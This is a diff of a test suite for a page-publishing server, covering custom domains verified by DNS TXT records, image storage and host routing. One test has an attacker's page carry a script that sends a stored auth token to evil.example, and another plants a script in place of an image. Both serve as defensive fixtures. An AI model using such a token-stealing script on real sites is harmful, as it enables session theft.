@@ -1,20 +1,24 @@
-// Published pages (server/pages.mjs), mostly through the real ai-server.mjs against the Supabase
-// stand-in: pages at https://<app>/<name> in a CSP sandbox, their images, names (format, reserved,
-// taken, renamed), unpublishing, the limits, and people's own domains (claimed once, checked, served
-// on their Host without the sandbox, home page, robots.txt, sitemap.xml, and never the app or /api).
+// Published pages (server/pages.mjs), mostly through the real ai-server.mjs against the Supabase and DNS
+// stand-ins: pages at https://<app>/<name> in a CSP sandbox, their images, names (format, reserved,
+// taken, renamed), unpublishing, the limits, people's own domains (proven by a TXT record, served on
+// their Host without the sandbox, home page, robots.txt, sitemap.xml, looked at again, taken over only
+// with the DNS's say-so), hosts that aren't the app's (never the app or /api), and requests built to hurt.
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 import fs from 'node:fs';
 import http from 'node:http';
+import net from 'node:net';
 import os from 'node:os';
 import path from 'node:path';
 import { spawn } from 'node:child_process';
 import { fileURLToPath } from 'node:url';
 import { createAuth } from './auth.mjs';
-import { claimable, createPages, imageTypeOf, isPrivateAddress, normalizeDomain, publicOnly } from './pages.mjs';
+import { claimable, clientOf, createPages, hostOf, imageTypeOf, normalizeDomain, txtResolver } from './pages.mjs';
+import { createMockDns } from './test/mock-dns.mjs';
 import { createMockSupabase } from './test/mock-supabase.mjs';
 
 const here = path.dirname(fileURLToPath(import.meta.url));
 const tmpDir = () => fs.mkdtempSync(path.join(os.tmpdir(), 'ylb-pages-'));
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
 // small files with the right first bytes (what the server checks; it never decodes the picture)
 const PNG = Buffer.concat([Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex'), Buffer.alloc(40, 7)]);
@@ -26,6 +30,8 @@ const image = (name, mime, bytes) => ({ name, mime, data: bytes.toString('base64
 const ARTIFACT_CSP = 'sandbox allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-modals allow-downloads';
 const SEO_CSP = 'sandbox allow-forms allow-popups allow-popups-to-escape-sandbox';
 const MIGRATION_HINT = 'Run supabase/migrations/20261103040000_published_pages.sql in Supabase → SQL Editor.';
+const TOKEN = /^ylb-[0-9a-f]{40}$/;
+const VERSION = /^[0-9a-z]{1,12}-[0-9a-f]{10}$/;
 
 async function freePort() {
   const s = http.createServer();
@@ -35,13 +41,20 @@ async function freePort() {
   return port;
 }
 
+// each request a visitor of its own (as the platform's proxy would say), unless a test says who it is
+let visitors = 0;
+const nextVisitor = () => {
+  visitors++;
+  return `198.18.${(visitors >> 8) & 255}.${visitors & 255}`;
+};
+
 /** Any request, with any Host header (fetch can't set one). */
 function request(base, pathname, { host, method = 'GET', headers = {}, body } = {}) {
   const u = new URL(base);
   return new Promise((resolve, reject) => {
     // content-length: Node frames a DELETE or OPTIONS body only when it's given
     const length = body === undefined ? {} : { 'content-length': Buffer.byteLength(body) };
-    const req = http.request({ host: u.hostname, port: u.port, path: pathname, method, headers: { ...(host ? { host } : {}), ...length, ...headers } }, (res) => {
+    const req = http.request({ host: u.hostname, port: u.port, path: pathname, method, headers: { ...(host ? { host } : {}), 'x-forwarded-for': nextVisitor(), ...length, ...headers } }, (res) => {
       const chunks = [];
       res.on('data', (c) => chunks.push(c));
       res.on('end', () => {
@@ -54,47 +67,32 @@ function request(base, pathname, { host, method = 'GET', headers = {}, body } = 
   });
 }
 
-/**
- * The internet, for the domain check (PAGES_CHECK_BASE): a linked domain reaches the app, as Replit
- * routes it. wrong.example.net answers with another site; moved.example.net redirects elsewhere.
- */
-async function startInternet(appPort) {
-  const server = http.createServer((req, res) => {
-    const host = String(req.headers.host || '');
-    if (host === 'wrong.example.net') {
-      res.writeHead(200, { 'content-type': 'text/plain' });
-      return res.end('somebody-elses-site');
-    }
-    if (host === 'moved.example.net') {
-      res.writeHead(301, { location: 'https://elsewhere.example.net/.well-known/ylb-domain-check' });
-      return res.end();
-    }
-    const up = http.request({ host: '127.0.0.1', port: appPort, path: req.url, method: req.method, headers: req.headers }, (r) => {
-      res.writeHead(r.statusCode, r.headers);
-      r.pipe(res);
-    });
-    up.on('error', () => {
-      res.writeHead(502);
-      res.end();
-    });
-    req.pipe(up);
+/** A request written by hand (a target no HTTP client sends): the status line of the answer, or '' if none came. */
+function raw(base, text) {
+  const u = new URL(base);
+  return new Promise((resolve) => {
+    let reply = '';
+    const s = net.connect(Number(u.port), u.hostname, () => s.write(text));
+    s.on('data', (d) => (reply += d));
+    const done = () => resolve(reply.split('\r\n')[0]);
+    s.on('close', done);
+    s.on('error', done);
+    setTimeout(() => s.destroy(), 3000);
   });
-  await new Promise((r) => server.listen(0, '127.0.0.1', r));
-  return { base: `http://127.0.0.1:${server.address().port}`, close: () => new Promise((r) => server.close(r)) };
 }
 
 let supa;
-let internet;
+let dnsServer;
 let child;
 let app;
 let alice;
 let bob;
+let serverLog = '';
 
-beforeAll(async () => {
-  supa = await (await createMockSupabase()).start();
+/** The real ai-server.mjs against the stand-ins. */
+async function startServer(env = {}) {
   const port = await freePort();
-  internet = await startInternet(port);
-  child = spawn(process.execPath, [path.join(here, 'ai-server.mjs')], {
+  const proc = spawn(process.execPath, [path.join(here, 'ai-server.mjs')], {
     env: {
       PATH: process.env.PATH,
       PORT: String(port),
@@ -105,27 +103,42 @@ beforeAll(async () => {
       SUPABASE_SECRET_KEY: supa.SECRET,
       ADMIN_EMAILS: 'owner@example.com',
       RATE_LIMIT_PER_MIN: '1000',
-      PAGES_CHECK_BASE: internet.base,
+      PAGES_DNS_SERVERS: dnsServer.server,
+      ...env,
     },
     stdio: ['ignore', 'pipe', 'pipe'],
   });
+  let out = '';
+  proc.stdout.on('data', (d) => (out += d));
+  proc.stderr.on('data', (d) => (out += d));
   await new Promise((resolve, reject) => {
-    let out = '';
-    child.stdout.on('data', (d) => {
-      out += d;
-      if (out.includes('Publishing pages: on')) resolve();
-    });
-    child.on('exit', (code) => reject(new Error(`server exited ${code}: ${out}`)));
+    const t = setInterval(() => {
+      // the line after "Publishing pages: on" says where the app answers
+      if (/Publishing pages: on[^\n]*\n[^\n]*\n[^\n]*\n/.test(out)) {
+        clearInterval(t);
+        resolve();
+      }
+    }, 20);
+    proc.on('exit', (code) => reject(new Error(`server exited ${code}: ${out}`)));
     setTimeout(() => reject(new Error(`server didn’t start: ${out}`)), 15_000);
   });
-  app = { base: `http://127.0.0.1:${port}` };
+  return { proc, base: `http://127.0.0.1:${port}`, log: () => out };
+}
+
+beforeAll(async () => {
+  supa = await (await createMockSupabase()).start();
+  dnsServer = await createMockDns();
+  const s = await startServer();
+  child = s.proc;
+  app = { base: s.base };
+  serverLog = s.log();
   alice = await supa.tokenFor('alice@pages.test');
   bob = await supa.tokenFor('bob@pages.test');
 }, 30_000);
 
 afterAll(async () => {
   child?.kill();
-  await internet?.close();
+  await dnsServer?.close();
   await supa?.close();
 });
 
@@ -134,7 +147,13 @@ const api = (pathname, { who, method = 'GET', body, headers = {} } = {}) =>
 const publish = (who, pageId, fields) =>
   api(`/api/pages/${encodeURIComponent(pageId)}`, { who, method: 'PUT', body: { kind: pageId.split(':')[0], title: 'A page', html: `<!doctype html><title>${pageId}</title><p>Hello from ${pageId}</p>`, images: [], ...fields } });
 const get = (pathname, opts) => request(app.base, pathname, opts);
+const at = (host, pathname, opts) => get(pathname, { ...opts, host });
 const rowsOf = (table) => supa.tables.get(table) ?? [];
+const addDomain = (who, domain) => api('/api/domains', { who, method: 'POST', body: { domain } });
+const checkDomain = async (who, domain) => (await api(`/api/domains/${domain}/check`, { who, method: 'POST' })).json();
+/** The domain's TXT record in the stand-in DNS (no values: the name is there without a TXT record). */
+const txt = (domain, ...values) => dnsServer.records.set(`_ylb-domain.${domain}`, values);
+const objectsUnder = (prefix) => [...supa.objects.keys()].filter((k) => k.startsWith(prefix));
 
 describe('publishing on the app’s address', () => {
   it('needs someone signed in, on the app’s own page', async () => {
@@ -219,13 +238,20 @@ describe('publishing on the app’s address', () => {
     expect(missing.text.toLowerCase()).not.toContain('yourlocalbusiness');
   });
 
-  it('stores only text Postgres can keep, and caps the title', async () => {
-    const r = await publish(alice, 'artifact:text1', { slug: 'alice-text', html: '<p>a\u0000b \ud83d</p>', title: `${'é'.repeat(299)}😀😀` });
+  it('stores only text Postgres can keep, and caps the title (however long it is)', async () => {
+    let r = await publish(alice, 'artifact:text1', { slug: 'alice-text', html: '<p>a\u0000b \ud83d</p>', title: `${'é'.repeat(299)}😀😀` });
     expect(r.status).toBe(200);
-    const row = rowsOf('published_pages').find((p) => p.slug === 'alice-text');
+    let row = rowsOf('published_pages').find((p) => p.slug === 'alice-text');
     expect(row.html).toBe('<p>ab �</p>');
     expect(Array.from(row.title)).toHaveLength(300);
     expect(row.title.endsWith('😀')).toBe(true); // whole characters only
+    // millions of characters: cut before they're counted
+    const t0 = Date.now();
+    r = await publish(alice, 'artifact:text1', { slug: 'alice-text', title: '😀'.repeat(1_500_000) });
+    expect(r.status).toBe(200);
+    expect(Date.now() - t0).toBeLessThan(3000);
+    row = rowsOf('published_pages').find((p) => p.slug === 'alice-text');
+    expect(row.title).toBe('😀'.repeat(300));
   });
 
   it('serves the images listed with the page, and only those', async () => {
@@ -236,32 +262,37 @@ describe('publishing on the app’s address', () => {
     });
     expect(r.status).toBe(200);
     const folder = `media/${alice.user.id}/published/seo-proj2`;
-    expect(supa.objects.get(`${folder}/img-1.png`)?.bytes.equals(PNG)).toBe(true);
-    expect(rowsOf('published_pages').find((p) => p.slug === 'alice-gallery').images).toEqual([
-      { name: 'img-1.png', mime: 'image/png', size: PNG.length, sha256: expect.stringMatching(/^[0-9a-f]{64}$/) },
-      { name: 'img-2.jpg', mime: 'image/jpeg', size: JPEG.length, sha256: expect.stringMatching(/^[0-9a-f]{64}$/) },
+    const listed = rowsOf('published_pages').find((p) => p.slug === 'alice-gallery').images;
+    expect(listed).toEqual([
+      { name: 'img-1.png', mime: 'image/png', size: PNG.length, sha256: expect.stringMatching(/^[0-9a-f]{64}$/), v: expect.stringMatching(VERSION) },
+      { name: 'img-2.jpg', mime: 'image/jpeg', size: JPEG.length, sha256: expect.stringMatching(/^[0-9a-f]{64}$/), v: listed[0].v },
     ]);
+    // each publish keeps its images in a folder of its own
+    const v1 = listed[0].v;
+    expect(supa.objects.get(`${folder}/${v1}/img-1.png`)?.bytes.equals(PNG)).toBe(true);
     const pic = await get('/alice-gallery/img/img-1.png');
     expect(pic.status).toBe(200);
     expect(pic.buf.equals(PNG)).toBe(true);
     expect(pic.headers).toMatchObject({ 'content-type': 'image/png', 'cache-control': 'public, max-age=86400', 'x-content-type-options': 'nosniff', 'content-security-policy': "default-src 'none'; sandbox" });
     expect((await get('/alice-gallery/img/img-2.jpg')).headers['content-type']).toBe('image/jpeg');
     // in the folder, but not listed with the page
-    supa.objects.set(`${folder}/img-9.png`, { bytes: PNG, type: 'image/png', created: Date.now() });
+    supa.objects.set(`${folder}/${v1}/img-9.png`, { bytes: PNG, type: 'image/png', created: Date.now() });
     expect((await get('/alice-gallery/img/img-9.png')).status).toBe(404);
     expect((await get('/alice-gallery/img/notes.txt')).status).toBe(404);
-    // republished without the first image: it goes from storage and stops answering
+    // republished without the first image: the old folder goes from storage, and the image stops answering
     r = await publish(alice, 'seo:proj2', { slug: 'alice-gallery', html: '<img src="/alice-gallery/img/img-2.jpg" alt="">', images: [image('img-2.jpg', 'image/jpeg', JPEG)] });
     expect(r.status).toBe(200);
-    expect(supa.objects.has(`${folder}/img-1.png`)).toBe(false);
-    expect(supa.objects.has(`${folder}/img-9.png`)).toBe(false);
+    const v2 = rowsOf('published_pages').find((p) => p.slug === 'alice-gallery').images[0].v;
+    expect(v2).not.toBe(v1);
+    expect(objectsUnder(`${folder}/`)).toEqual([`${folder}/${v2}/img-2.jpg`]);
     expect((await get('/alice-gallery/img/img-1.png')).status).toBe(404);
     expect((await get('/alice-gallery/img/img-2.jpg')).status).toBe(200);
   });
 
   it('serves only the exact image checked at publishing, even if the stored file changes', async () => {
     expect((await publish(alice, 'artifact:gif1', { slug: 'alice-animation', images: [image('img-1.gif', 'image/gif', GIF), image('img-2.webp', 'image/webp', WEBP), image('img-3.png', 'image/png', PNG)] })).status).toBe(200);
-    const folder = `media/${alice.user.id}/published/artifact-gif1`;
+    const { v } = rowsOf('published_pages').find((p) => p.slug === 'alice-animation').images[0];
+    const folder = `media/${alice.user.id}/published/artifact-gif1/${v}`;
     // people can write to their own folder directly: an HTML file in place of an image…
     supa.objects.set(`${folder}/img-1.gif`, { bytes: Buffer.from('<script>steal()</script>'), type: 'text/html', created: Date.now() });
     expect((await get('/alice-animation/img/img-1.gif')).status).toBe(404);
@@ -271,6 +302,26 @@ describe('publishing on the app’s address', () => {
     const webp = await get('/alice-animation/img/img-2.webp');
     expect(webp.status).toBe(200);
     expect(webp.headers['content-type']).toBe('image/webp');
+  });
+
+  it('a publish that fails changes nothing: the live page keeps its images, the new ones go, and Postgres’s words stay inside', async () => {
+    expect((await publish(alice, 'seo:keep1', { slug: 'alice-keeps', images: [image('img-1.png', 'image/png', PNG)] })).status).toBe(200);
+    const { v } = rowsOf('published_pages').find((p) => p.slug === 'alice-keeps').images[0];
+    const folder = `media/${alice.user.id}/published/seo-keep1`;
+    supa.behavior.fail = (method, pathname) => (method === 'POST' && pathname === '/rest/v1/published_pages' ? { status: 500, body: { code: '57014', message: 'canceling statement due to statement timeout on secret_table_7' } } : null);
+    let r;
+    try {
+      r = await publish(alice, 'seo:keep1', { slug: 'alice-keeps', images: [image('img-1.png', 'image/png', Buffer.concat([PNG, Buffer.from('new')]))] });
+    } finally {
+      supa.behavior.fail = null;
+    }
+    expect(r.status).toBe(502);
+    const body = await r.json();
+    expect(body).toEqual({ error: 'Supabase refused that (error 500). Try again.', code: 'UPSTREAM' });
+    // the live page's image is the one it was published with, and nothing else was left behind
+    expect(objectsUnder(`${folder}/`)).toEqual([`${folder}/${v}/img-1.png`]);
+    expect(supa.objects.get(`${folder}/${v}/img-1.png`).bytes.equals(PNG)).toBe(true);
+    expect((await get('/alice-keeps/img/img-1.png')).buf.equals(PNG)).toBe(true);
   });
 
   it('moves a page to its new name: the old name stops working at once and is free again', async () => {
@@ -296,7 +347,7 @@ describe('publishing on the app’s address', () => {
     expect(await r.json()).toEqual({ ok: true });
     expect((await get('/alice-leaving')).status).toBe(404);
     expect((await get('/alice-leaving/img/img-1.png')).status).toBe(404);
-    expect(supa.objects.has(`media/${alice.user.id}/published/seo-gone1/img-1.png`)).toBe(false);
+    expect(objectsUnder(`media/${alice.user.id}/published/seo-gone1/`)).toEqual([]);
     expect(rowsOf('published_pages').some((p) => p.page_id === 'seo:gone1')).toBe(false);
     // bob can't unpublish alice's page
     await api(`/api/pages/${encodeURIComponent('artifact:widget1')}`, { who: bob, method: 'DELETE' });
@@ -332,53 +383,54 @@ describe('publishing on the app’s address', () => {
     expect(r.status).toBe(400);
     r = await publish(alice, 'seo:empty', { slug: 'alice-empty', html: '   ' });
     expect(r.status).toBe(400);
+    // a domain that isn't one isn't quietly left off
+    r = await publish(alice, 'seo:dom0', { slug: 'alice-dom0', domain: 'not a domain at all' });
+    expect(r.status).toBe(400);
   });
 });
 
 describe('people’s own domains', () => {
-  const at = (host, pathname, opts) => get(pathname, { ...opts, host });
+  let shopToken;
 
-  it('claims a domain once, checks it reaches the app, and serves its pages there without the sandbox', async () => {
-    let r = await api('/api/domains', { who: alice, method: 'POST', body: { domain: 'https://Shop.Example.com:443/about' } });
+  it('adds a domain, proves it with a TXT record, and only then serves its pages there, without the sandbox', async () => {
+    let r = await addDomain(alice, 'https://Shop.Example.com:443/about');
     expect(r.status).toBe(200);
-    const claimed = await r.json();
-    expect(claimed).toEqual({ domain: 'shop.example.com', token: expect.stringMatching(/^[0-9a-f]{32}$/), verified: false, verifiedAt: null });
-    // adding it again changes nothing; someone else can't take it
-    expect(await (await api('/api/domains', { who: alice, method: 'POST', body: { domain: 'shop.example.com.' } })).json()).toEqual(claimed);
-    r = await api('/api/domains', { who: bob, method: 'POST', body: { domain: 'SHOP.example.com' } });
-    expect(r.status).toBe(409);
-    expect((await r.json()).code).toBe('DOMAIN_TAKEN');
-    for (const domain of ['', 'localhost', '127.0.0.1', '[::1]', 'my-app.replit.app', 'preview.replit.dev', 'shop.localhost', 'not a domain', 'nodot']) {
-      r = await api('/api/domains', { who: bob, method: 'POST', body: { domain } });
+    const added = await r.json();
+    shopToken = added.token;
+    expect(added).toEqual({ domain: 'shop.example.com', token: expect.stringMatching(TOKEN), verified: false, verifiedAt: null, record: { type: 'TXT', name: '_ylb-domain.shop.example.com', value: added.token } });
+    // adding it again changes nothing
+    expect(await (await addDomain(alice, 'shop.example.com.')).json()).toEqual(added);
+    for (const domain of ['', 'localhost', '127.0.0.1', '[::1]', 'my-app.replit.app', 'preview.replit.dev', 'shop.localhost', 'printer.local', 'db.internal', 'not a domain', 'nodot']) {
+      r = await addDomain(bob, domain);
       expect(r.status, domain).toBe(400);
       expect((await r.json()).code, domain).toBe('BAD_DOMAIN');
     }
-    // the app's own address (the host this request was made to)
-    r = await get('/api/domains', { host: 'app.mybiz.test', method: 'POST', headers: { authorization: `Bearer ${bob.token}`, 'content-type': 'application/json' }, body: JSON.stringify({ domain: 'App.MyBiz.test' }) });
-    expect(r.status).toBe(400);
-    expect(JSON.parse(r.text).code).toBe('BAD_DOMAIN');
 
-    // the code the check looks for, on the domain itself
-    const code = await at('shop.example.com', '/.well-known/ylb-domain-check');
-    expect(code.status).toBe(200);
-    expect(code.text).toBe(claimed.token);
-    expect(code.headers['cache-control']).toBe('no-store');
-    r = await api('/api/domains/shop.example.com/check', { who: alice, method: 'POST' });
-    expect(await r.json()).toEqual({ verified: true });
-    expect((await (await api('/api/pages', { who: alice })).json()).domains).toEqual([{ domain: 'shop.example.com', token: claimed.token, verified: true, verifiedAt: expect.any(String) }]);
-    // bob can't check (or remove) alice's domain
-    expect((await api('/api/domains/shop.example.com/check', { who: bob, method: 'POST' })).status).toBe(404);
-
-    // a domain that answers with another site, and one that redirects somewhere else
-    await api('/api/domains', { who: alice, method: 'POST', body: { domain: 'wrong.example.net' } });
-    expect(await (await api('/api/domains/wrong.example.net/check', { who: alice, method: 'POST' })).json()).toEqual({ verified: false, error: expect.stringContaining('not with this app') });
-    await api('/api/domains', { who: alice, method: 'POST', body: { domain: 'moved.example.net' } });
-    expect(await (await api('/api/domains/moved.example.net/check', { who: alice, method: 'POST' })).json()).toEqual({ verified: false, error: expect.stringContaining('another address') });
-
-    // a page on the domain
+    // a page on it waits for the TXT record
     r = await publish(alice, 'seo:shop1', { slug: 'candle-shop', domain: 'shop.example.com', html: '<!doctype html><h1>Candle shop</h1><img src="/candle-shop/img/img-1.png" alt="">', images: [image('img-1.png', 'image/png', PNG)] });
     expect(r.status).toBe(200);
     expect(await r.json()).toMatchObject({ url: `${app.base}/candle-shop`, domainUrl: 'https://shop.example.com/candle-shop', page: { domain: 'shop.example.com', home: false } });
+    expect((await at('shop.example.com', '/candle-shop')).status).toBe(404);
+    // no record yet, then one with another value
+    expect(await checkDomain(alice, 'shop.example.com')).toEqual({ verified: false, error: expect.stringContaining('There’s no TXT record at _ylb-domain.shop.example.com yet') });
+    txt('shop.example.com');
+    expect(await checkDomain(alice, 'shop.example.com')).toEqual({ verified: false, error: expect.stringContaining('no TXT record') });
+    txt('shop.example.com', 'v=spf1 -all', 'ylb-0000000000000000000000000000000000000000');
+    expect(await checkDomain(alice, 'shop.example.com')).toEqual({ verified: false, error: expect.stringContaining('not with this account’s value') });
+    expect((await at('shop.example.com', '/candle-shop')).status).toBe(404);
+    // the DNS can't answer: nothing changes, and it says so
+    dnsServer.records.set('_ylb-domain.shop.example.com', 'SERVFAIL');
+    expect(await checkDomain(alice, 'shop.example.com')).toEqual({ verified: false, error: expect.stringContaining('didn’t get an answer') });
+
+    // the record: it's hers
+    txt('shop.example.com', 'v=spf1 -all', shopToken);
+    const checked = await checkDomain(alice, 'shop.example.com');
+    expect(checked).toEqual({ verified: true, domain: { ...added, verified: true, verifiedAt: expect.any(String) } });
+    expect((await (await api('/api/pages', { who: alice })).json()).domains).toEqual([checked.domain]);
+    // the check asked the DNS, never the domain itself (which this server may answer)
+    expect(dnsServer.asked.some((q) => q.name === '_ylb-domain.shop.example.com' && q.type === 16)).toBe(true);
+    expect((await at('shop.example.com', '/.well-known/ylb-domain-check')).status).toBe(404);
+
     const page = await at('shop.example.com', '/candle-shop');
     expect(page.status).toBe(200);
     expect(page.text).toContain('Candle shop');
@@ -435,15 +487,99 @@ describe('people’s own domains', () => {
       expect(res.status, method).toBe(405);
       expect(asJson(res), method).toBe(false);
     }
-    // a host nobody claimed is the app as usual
-    const other = await at('other.example.org', '/api/config');
-    expect(asJson(other)).toBe(true);
   });
 
-  it('removing a domain keeps its pages on the app’s address', async () => {
+  it('lets another account take a domain over only with its own TXT record', async () => {
+    const mallory = await supa.tokenFor('mallory@pages.test');
+    // mallory adds bob's domain first (she doesn't control its DNS), and puts a page on it
+    expect((await addDomain(mallory, 'bobs-bakery.example.com')).status).toBe(200);
+    const steal = '<!doctype html><script>fetch("https://evil.example/c",{method:"POST",body:localStorage.getItem("ylb-auth")})</script>';
+    expect((await publish(mallory, 'artifact:m1', { slug: 'mallory-home', domain: 'bobs-bakery.example.com', home: true, html: steal })).status).toBe(200);
+    // it isn't hers: nothing shows there, and her check says why
+    expect(await checkDomain(mallory, 'bobs-bakery.example.com')).toMatchObject({ verified: false, error: expect.stringContaining('no TXT record') });
+    const there = await at('bobs-bakery.example.com', '/');
+    expect(there.status).toBe(404);
+    expect(there.text).not.toContain('ylb-auth');
+
+    // bob adds it: another account has it, and here's the record that moves it to his
+    let r = await addDomain(bob, 'bobs-bakery.example.com');
+    expect(r.status).toBe(409);
+    const taken = await r.json();
+    expect(taken).toMatchObject({ code: 'DOMAIN_TAKEN', domain: { domain: 'bobs-bakery.example.com', verified: false, verifiedAt: null, record: { type: 'TXT', name: '_ylb-domain.bobs-bakery.example.com', value: expect.stringMatching(TOKEN) } } });
+    const malloryValue = (await (await api('/api/pages', { who: mallory })).json()).domains.find((d) => d.domain === 'bobs-bakery.example.com').record.value;
+    expect(taken.domain.record.value).not.toBe(malloryValue);
+    // a record with mallory's value (or none) moves nothing
+    txt('bobs-bakery.example.com', malloryValue);
+    expect(await checkDomain(bob, 'bobs-bakery.example.com')).toMatchObject({ verified: false, error: expect.stringContaining('not with this account’s value') });
+    expect(rowsOf('published_domains').find((d) => d.domain === 'bobs-bakery.example.com').user_id).toBe(mallory.user.id);
+
+    // with bob's record it's his, in one step; mallory's page stays published, on the app's address only
+    txt('bobs-bakery.example.com', taken.domain.record.value);
+    expect(await checkDomain(bob, 'bobs-bakery.example.com')).toEqual({ verified: true, domain: { ...taken.domain, verified: true, verifiedAt: expect.any(String) } });
+    expect(rowsOf('published_domains').find((d) => d.domain === 'bobs-bakery.example.com')).toMatchObject({ user_id: bob.user.id, token: taken.domain.record.value });
+    expect(rowsOf('published_pages').find((p) => p.slug === 'mallory-home')).toMatchObject({ domain: null, home: false });
+    expect((await get('/mallory-home')).headers['content-security-policy']).toBe(ARTIFACT_CSP);
+    expect((await (await api('/api/pages', { who: mallory })).json()).domains.map((d) => d.domain)).not.toContain('bobs-bakery.example.com');
+    r = await publish(mallory, 'artifact:m1', { slug: 'mallory-home', domain: 'bobs-bakery.example.com', home: true, html: steal });
+    expect((await r.json()).code).toBe('DOMAIN_NOT_YOURS');
+    expect((await publish(bob, 'seo:bakery1', { slug: 'bobs-bakery', domain: 'bobs-bakery.example.com', home: true, html: '<h1>Bob’s bakery</h1>' })).status).toBe(200);
+    expect((await at('bobs-bakery.example.com', '/')).text).toContain('Bob’s bakery');
+    expect((await at('bobs-bakery.example.com', '/mallory-home')).status).toBe(404);
+    // and she can't take it back without a record of her own
+    expect(await checkDomain(mallory, 'bobs-bakery.example.com')).toMatchObject({ verified: false });
+    expect(rowsOf('published_domains').find((d) => d.domain === 'bobs-bakery.example.com').user_id).toBe(bob.user.id);
+  });
+
+  it('counts a check from before TXT records only once the domain has one', async () => {
+    // verified by the old check (an answer from the domain itself, which this server gave)
+    rowsOf('published_domains').push({ domain: 'older.example.com', user_id: alice.user.id, token: 'a1b2c3d4e5f60718293a4b5c6d7e8f90', verified_at: new Date().toISOString(), created_at: new Date().toISOString() });
+    expect((await publish(alice, 'seo:older1', { slug: 'older-page', domain: 'older.example.com', home: true, html: '<h1>Older</h1>' })).status).toBe(200);
+    expect((await at('older.example.com', '/')).status).toBe(404);
+    const listed = (await (await api('/api/pages', { who: alice })).json()).domains.find((d) => d.domain === 'older.example.com');
+    expect(listed).toMatchObject({ verified: false, verifiedAt: null, token: expect.stringMatching(TOKEN), record: { name: '_ylb-domain.older.example.com' } });
+    txt('older.example.com', listed.record.value);
+    expect(await checkDomain(alice, 'older.example.com')).toMatchObject({ verified: true });
+    expect(rowsOf('published_domains').find((d) => d.domain === 'older.example.com').token).toBe(listed.record.value);
+    expect((await at('older.example.com', '/')).text).toContain('Older');
+  });
+
+  it('looks at a verified domain’s record again after a while, and stops showing it once the record is gone', async () => {
+    const setUp = async (domain, slug) => {
+      const { token } = await (await addDomain(alice, domain)).json();
+      txt(domain, token);
+      expect(await checkDomain(alice, domain)).toMatchObject({ verified: true });
+      expect((await publish(alice, `seo:${slug}`, { slug, domain, home: true, html: `<h1>${slug}</h1>` })).status).toBe(200);
+      // its last check was 7 hours ago (and no visitor has asked for it yet, so the server reads that)
+      const row = rowsOf('published_domains').find((d) => d.domain === domain);
+      row.verified_at = new Date(Date.now() - 7 * 60 * 60_000).toISOString();
+      return row;
+    };
+    const until = async (test) => {
+      for (let i = 0; i < 100 && !test(); i++) await sleep(30);
+      return test();
+    };
+    // the record is still there: the check is renewed
+    const kept = await setUp('kept.example.com', 'kept-page');
+    const before = kept.verified_at;
+    expect((await at('kept.example.com', '/')).status).toBe(200);
+    expect(await until(() => rowsOf('published_domains').find((d) => d.domain === 'kept.example.com').verified_at !== before)).toBe(true);
+    expect(Date.now() - Date.parse(rowsOf('published_domains').find((d) => d.domain === 'kept.example.com').verified_at)).toBeLessThan(60_000);
+    expect((await at('kept.example.com', '/')).status).toBe(200);
+
+    // the record is gone: the domain stops showing pages, until it's back and checked again
+    await setUp('lapsed.example.com', 'lapsed-page');
+    dnsServer.records.delete('_ylb-domain.lapsed.example.com');
+    await at('lapsed.example.com', '/');
+    expect(await until(() => rowsOf('published_domains').find((d) => d.domain === 'lapsed.example.com').verified_at === null)).toBe(true);
+    expect((await at('lapsed.example.com', '/')).status).toBe(404);
+    expect((await get('/lapsed-page')).status).toBe(200); // still on the app's address
+    const listed = (await (await api('/api/pages', { who: alice })).json()).domains.find((d) => d.domain === 'lapsed.example.com');
+    expect(listed.verified).toBe(false);
+  });
+
+  it('removing a domain keeps its pages on the app’s address, and the domain shows nothing', async () => {
     expect((await api('/api/domains/shop.example.com', { who: bob, method: 'DELETE' })).status).toBe(200); // not his: nothing happens
     expect((await at('shop.example.com', '/candle-shop')).status).toBe(200);
-    const { token } = rowsOf('published_domains').find((d) => d.domain === 'shop.example.com');
     const r = await api('/api/domains/shop.example.com', { who: alice, method: 'DELETE' });
     expect(await r.json()).toEqual({ ok: true });
     const list = await (await api('/api/pages', { who: alice })).json();
@@ -451,56 +587,202 @@ describe('people’s own domains', () => {
     expect(list.pages.find((p) => p.slug === 'scent-quiz')).toMatchObject({ domain: null, home: false });
     expect(list.pages.find((p) => p.slug === 'scent-quiz').domainUrl).toBeUndefined();
     expect((await get('/scent-quiz')).status).toBe(200);
-    // the domain is no one's now: it no longer shows them unsandboxed, nor its code
-    expect((await at('shop.example.com', '/scent-quiz')).headers['content-security-policy']).toBe(ARTIFACT_CSP);
-    expect((await at('shop.example.com', '/.well-known/ylb-domain-check')).text).not.toContain(token);
+    // the domain is no one's now: not the pages, not the app
+    for (const p of ['/', '/scent-quiz', '/api/config']) {
+      const res = await at('shop.example.com', p);
+      expect(res.status, p).toBe(404);
+      expect(res.text, p).toContain('Page not found');
+    }
+  });
+});
+
+describe('which host gets what', () => {
+  const asJson = (res) => /application\/json/.test(String(res.headers['content-type']));
+
+  it('answers with the app only on its own hosts', async () => {
+    for (const host of ['yourlocalbusiness.replit.app', 'x-1.picard.replit.dev', 'old.repl.co', 'localhost:8787', '127.0.0.1', '[::1]:8787', 'printer.local']) {
+      const res = await at(host, '/api/config');
+      expect(res.status, host).toBe(200);
+      expect(asJson(res), host).toBe(true);
+    }
+  });
+
+  it('shows "not found" on any other host, whether or not anyone has claimed it, and never the app or /api', async () => {
+    // unverified (added, no record) and never added at all
+    expect((await addDomain(alice, 'pending.example.com')).status).toBe(200);
+    for (const host of ['pending.example.com', 'nobody-claimed.example.org', 'app.mybiz.test']) {
+      for (const p of ['/', '/api/config', '/api/pages', '/assets/index.js', '/login']) {
+        const res = await at(host, p, { headers: { authorization: `Bearer ${alice.token}` } });
+        expect(res.status, `${host}${p}`).toBe(404);
+        expect(asJson(res), `${host}${p}`).toBe(false);
+        expect(res.text, `${host}${p}`).toContain('Page not found');
+      }
+      // the API doesn't answer there, even to add that very domain
+      const res = await at(host, '/api/domains', { method: 'POST', headers: { authorization: `Bearer ${bob.token}`, 'content-type': 'application/json' }, body: JSON.stringify({ domain: host }) });
+      expect(res.status, host).toBe(404);
+      expect(asJson(res), host).toBe(false);
+    }
+  });
+
+  it('says at startup where the app answers, and that its own domain goes in APP_HOSTS', () => {
+    expect(serverLog).toContain('The app and /api answer on *.replit.app, *.replit.dev, *.repl.co, localhost and IP addresses.');
+    expect(serverLog).toContain('If the app has a custom domain of its own, list it in the APP_HOSTS Secret (it’s empty now).');
+  });
+
